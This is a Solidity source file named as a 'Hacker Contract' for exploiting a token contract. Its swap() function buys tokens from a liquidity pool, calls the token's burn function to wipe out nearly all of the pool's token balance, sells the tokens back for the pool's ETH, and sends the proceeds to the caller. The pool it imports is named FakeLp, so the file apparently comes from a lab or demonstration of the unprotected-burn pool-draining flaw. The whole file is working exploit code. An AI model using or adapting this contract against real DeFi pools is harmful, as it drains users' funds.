// SPDX-License-Identifier: MIT
pragma solidity ^0.5.16;

//Hacker Contract ,to exploit the contract
import "./BEP20Token.sol";
import "./FakeLp.sol";

contract HackerContract {

    using SafeMath for uint256;
    FakeLp public c1;
    BEP20Token public c2;
    address public token;
    address public pool;

    constructor(address _token, address _pool) public {
        token = _token;
        pool = _pool;
        c1 = FakeLp(pool);
        c2 = BEP20Token(token);
    }


    function swap() public payable{
        bool x = c1.swapETHForToken(address(this).balance);
        if(x){
            bool y = c2.burn(pool, (c2.balanceOf(pool)).sub(1));
            if(y){
                bool z = c1.swapTokenForETH(c2.balanceOf(address(this)));
                    if(z){
                        (msg.sender).transfer(address(this).balance);
                    }
            }
        }
    }

    function () external payable {
    }

    function fallback() external payable {

    }

}